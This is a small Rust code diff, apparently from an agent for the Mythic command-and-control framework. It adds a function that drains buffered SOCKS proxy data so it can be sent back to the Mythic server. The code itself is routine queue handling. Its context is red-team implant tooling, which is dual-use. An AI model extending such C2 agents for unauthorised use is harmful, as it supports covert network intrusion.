@@ -357,3 +357,9 @@ pub fn setup_socks(
 ) -> Result<(), Box<dyn Error>> {
     handle_socks(rx)
 }
+
+// Add this function to periodically send SOCKS data to Mythic
+pub fn get_socks_data() -> Vec<Value> {
+    let mut out = SOCKS_OUT.lock().unwrap();
+    out.drain(..).collect()
+}
